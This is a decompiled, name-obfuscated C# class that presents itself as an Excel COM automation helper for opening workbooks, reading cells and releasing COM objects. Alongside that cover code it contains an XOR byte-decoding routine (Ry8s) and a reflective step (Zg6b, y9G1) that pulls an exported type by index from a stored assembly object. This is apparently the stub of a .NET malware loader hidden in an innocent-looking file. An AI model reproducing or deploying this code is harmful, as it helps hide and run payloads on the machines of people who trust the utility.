using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Er8;
using Microsoft.VisualBasic.CompilerServices;
using Tn28;
using Yp21;
using i6N3;
using m0Z3;

namespace g0J9;

public class Nq6y
{
	private Pp09 _oXls;

	private Ct2n _oWBook;

	private Dw3g _oSheet;

	public Pp09 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public Ct2n OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Dw3g OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Nq6y()
	{
		_oXls = (Pp09)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Po92(string s4H6, bool f6A9)
	{
		OWBook = OXls.Workbooks.Open(s4H6, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = f6A9;
	}

	internal static bool Zg6b()
	{
		try
		{
			try
			{
				Type type = (Type)y9G1(RuntimeHelpers.GetObjectValue(Pt8.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Pt8.mDic[Pt8.tName].ToString(), false) == 0)
				{
					Pt8.mDic.Add(Pt8.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Pd3q(string Fa6p)
	{
		OSheet = (Dw3g)OWBook.Sheets[Fa6p];
	}

	public t5H8 Ea4b(int Jw4b, int e4T7)
	{
		return (t5H8)OSheet.Cells[Jw4b, e4T7];
	}

	public void Jq82(bool La6i)
	{
		if (OWBook != null)
		{
			OWBook.Close(La6i, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Pp09 Fd = OXls;
		Ay0m(ref Fd);
		OXls = Fd;
	}

	internal static byte Ry8s(byte i8AD, byte[] d8J6, int r8N1, int Ws7a)
	{
		i8AD = (byte)(i8AD ^ checked((byte)(d8J6[unchecked(Ws7a % d8J6.Length)] ^ ((Ws7a + unchecked(r8N1 % d8J6.Length)) & r8N1))));
		return i8AD;
	}

	private static void Ay0m<s1Z9>(ref s1Z9 Fd84, bool n2G6 = false) where s1Z9 : class
	{
		if (Fd84 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Fd84))
			{
				if (n2G6)
				{
					Marshal.FinalReleaseComObject(Fd84);
				}
				else
				{
					Marshal.ReleaseComObject(Fd84);
				}
			}
		}
		finally
		{
			Fd84 = null;
		}
	}

	internal static object y9G1(object Pk7r)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Pk7r, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
